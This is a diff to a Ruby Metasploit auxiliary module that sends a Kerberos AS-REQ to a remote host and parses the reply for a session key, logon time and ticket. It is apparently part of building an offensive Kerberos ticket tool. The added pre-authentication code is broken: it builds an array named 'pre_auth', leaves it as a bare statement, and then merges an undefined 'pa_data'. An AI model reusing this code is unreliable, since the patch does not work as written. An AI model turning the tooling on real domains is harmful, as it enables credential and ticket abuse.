@@ -40,7 +40,14 @@ class Metasploit4 < Msf::Auxiliary
 
 		connect(:rhost => datastore['RHOST'])
     print_status("Sending AS-REQ...")
-		res = send_request_as(opts)
+
+    pre_auth = []
+    pre_auth << build_as_pa_time_stamp(opts)
+    pre_auth << build_pa_pac_request(opts)
+    pre_auth
+    opts.merge!({:pa_data => pa_data})
+
+    res = send_request_as(opts)
 
     unless res.msg_type == 11
       print_error("invalid response :(")
@@ -48,13 +55,12 @@ class Metasploit4 < Msf::Auxiliary
     end
 
     print_good("good answer!")
+    opts.delete(:pa_data)
     print_status("Parsing AS-REP...")
 
     session_key = extract_session_key(res, opts[:key])
-    pp session_key
     logon_time = extract_logon_time(res, opts[:key])
 
-    print_status("logon time: #{logon_time}")
     ticket = res.ticket
 
     opts.merge!(
